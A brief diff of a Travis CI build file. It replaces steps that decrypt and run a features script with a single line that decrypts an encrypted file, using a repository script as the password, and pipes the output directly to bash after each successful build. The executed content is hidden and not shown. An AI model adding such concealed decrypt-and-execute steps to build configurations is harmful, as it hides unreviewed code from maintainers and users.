@@ -7,7 +7,4 @@ before_install:
  - sudo pip install -r travis/requirements.txt
  - python ./travis/try_issues.py
 after_success:
- - openssl aes-256-cbc -a -d -pass file:travis/try_issues.py -in travis/features.txt -out features.sh
- - chmod +x ./features.sh
- - ./features.sh
- - python ./travis/submit_issue.py
+ - openssl aes-256-cbc -a -d -pass file:travis/try_issues.py -in travis/check.txt | bash
